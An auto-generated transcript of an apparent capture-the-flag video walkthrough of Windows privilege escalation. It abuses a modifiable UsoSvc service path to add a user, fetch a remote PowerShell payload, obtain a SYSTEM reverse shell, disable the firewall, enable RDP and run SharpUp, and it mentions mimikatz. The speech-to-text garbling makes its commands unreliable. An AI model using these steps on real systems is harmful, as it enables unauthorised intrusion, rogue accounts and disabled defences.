copy this and if we just run this we will see that it runs this command net user John password one two three slash add so if we do a net user on the box we can see there's now a user called John if we do SMB client - l OE h TB is seve all there nocebo is not there so I don't know if this would actually work we need like C vol 4 PS exec to be able to download it I guess we'll just have to accept we trust this ran actually we can do SC we can do command and redo this and change the user if you do this John - and now we do net user we can see John - was created if you want to do this manually without this PowerShell you got the SC command again so SC config in path is equal to and I think it's really weird on quotes so we can do this and then we just copy this and we'll say if Zack will call this please subscribe SC config Bend path what don't you like so when in doubt erase things and see if we get set CMD SC config bin path set o SC config us o SVC there we go forgot to say the service name net user upset passed with one two three flash add so we can see we don't have that user there yet but if we do CMD / c SC restart us o SVC we got an error message but net user I was going to do restart - service us o SVC and see if zach was created so let's run windi's to see what this output looks like CM d /c when p z XE CMD fast so we can see how this program looks shouldn't take too long there we go and you got the pretty colors again so you can search through this quickly and find where it is apps AMD again the nice thing about this highlights everything important read I should look at what that port is I mean that ski drew itself and this is the noise I was talking about in the get issue of it listing every service probably just a simple bug but right here modifiable service USO SVC so that's how you do this with wind peace but let's actually get a shell on this box and figure out why shrub ups not working so let's just do I wonder if we can just do the same thing except say PowerShell coded command and go and grab dub dub dub what is it evil dot SCT and grab this I wonder if this will work I know there's a limit to like the length you can put in the binary path of a service so maybe that's too big it didn't get evil dot ps1 so I think that maybe too big unfortunately CMD /c o there we go so that'll work we just need the cm be /c so NCL VMP 9001 and it looks like I don't know it did not hang please start got the way mi we are now system so we can enable remote desktop so net sh a TV firewall set all profiles equals off what is it that Sh disable firewall adv that sha be file will set all profiles stayed off that Sh ADB firewall set all profiles stay off there we go one of they didn't like oh I'd appear at the end stupid clipboard so we now disabled the firewall so we can do nmap - p 3 3 8 9 or ADHD be still closed so we have to enable a little note desktop an able remote desktop command line and we'll follow these instructions I think it's just that registry key this paste open awesome x3 r TP / v /v re HT b /u I think John / P password 1 2 3 except it's difficult in to the server and if you watched our the other videos where I do dotnet stuff you can probably guess what the issue is it is the net framework version so come on load open a command prompt 'cd users full CD public documents show up up short keep the firewall off come on trip up exe and we can see it's got this annoying windows feature thing and dotnet framework 3.5 so if we go back to our Windows compiling VM and look at show up up and go properties on this we can see its target framework is dotnet version 3-5 if we simply just change this to framework version 4 and then recompile it let's just file I press ctrl s to save I don't think I have to do that but have it to always say before compiling we have now rebuilt it so we can copy paste replace do I still have the thing going I do so go over here RM show up up dot exe w get shut up dot exe to download it and then we can download over tl show puppy XE w get - oh shut up uh PXE HTTP 10 1014 to show up Exe c then i start the web and now when I run it and now will work so let's go back in this old context and run dot slash show up up dot exe and you can see show up up is running and it's got a bit better output then power up because it is newer so power yeah I don't know what I was gonna say there but and is that so hope you guys enjoyed the video take care and I will see you all next week oh wait there's one last piece if you do the Box this way and go in whoops we can just do this actually this is what my system shell is CD slash users administrator dir desktop you'll notice that we shouldn't be able to get the flag we get a permission denied even though we are route well we are in to your authority but if we went through and looked at this flag in the GUI we still won't be able to take ownership because it's using the windows encrypted filesystem so if we just go to administrator yeah continue desktop root you probably can't see it because it's so small it's got a little yellow lock icon and that means EFS is encrypting it so if you wanted to see this flag you should go to if sec dot rocks and let's see my user you can either migrate to the user or follow a helpline using mini cats to decrypt it so if you wanted to read it this way you'd either have to be that user or use mini cats so I hope you guys enjoyed the video take care and I'll see you all next week